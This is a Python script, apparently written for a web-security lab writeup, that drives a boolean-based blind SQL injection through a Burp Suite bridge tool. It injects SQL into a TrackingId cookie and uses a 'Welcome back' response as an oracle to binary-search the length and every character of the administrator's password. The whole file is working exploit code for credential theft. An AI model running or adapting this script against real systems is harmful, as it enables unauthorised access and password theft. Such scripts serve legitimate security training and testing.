#!/usr/bin/env python3
"""Drives blind SQLi extraction via cc-burp /repeat against history id 25 (TID echo baseline).

Counts calls so the writeup can report exact bridge usage.
"""
import json, os, subprocess, sys, time

CCBURP = os.path.expanduser("~/burp-ext/cc-bridge/cc-burp")
BASE_ID = 25
TID = "0eZt5HkcHEe6gKmw"
WELCOME = "Welcome back"

calls = 0
def repeat(payload_sql, label):
    """Run a /repeat with the given inline-SQL TrackingId suffix, return True iff Welcome back present."""
    global calls
    calls += 1
    cookie = f"TrackingId={TID}' {payload_sql}--"
    body = json.dumps({"headers": {"Cookie": cookie}, "label": label})
    out = subprocess.check_output([CCBURP, f"repeat/{BASE_ID}", "-d", body])
    d = json.loads(out)
    return WELCOME in d["response"]["body"]

def bsearch_len(lo=1, hi=40):
    """Returns smallest L where (length>L) is False — i.e. the exact length."""
    while lo < hi:
        mid = (lo + hi) // 2
        # predicate: length > mid
        is_gt = repeat(
            f"AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{mid}",
            f"len-gt-{mid}",
        )
        if is_gt:
            lo = mid + 1
        else:
            hi = mid
    return lo  # boundary: length > lo-1 true, length > lo false  -> length == lo

def bsearch_char(pos):
    """Returns the printable-ASCII char at 1-indexed position `pos` using binary search."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        is_gt = repeat(
            f"AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1))>{mid}",
            f"c{pos}-gt-{mid}",
        )
        if is_gt:
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def main():
    t0 = time.time()
    print("[*] finding password length...")
    L = bsearch_len(1, 40)
    print(f"[+] password length = {L}  ({calls} calls so far)")

    pwd = []
    for i in range(1, L + 1):
        c = bsearch_char(i)
        pwd.append(c)
        sofar = "".join(pwd)
        print(f"[+] char {i:2d} = {c!r}  -> {sofar!r}  ({calls} calls total)")

    elapsed = time.time() - t0
    print()
    print(f"PASSWORD = {''.join(pwd)}")
    print(f"TOTAL CALLS = {calls}")
    print(f"WALL TIME = {elapsed:.1f}s")

if __name__ == "__main__":
    main()
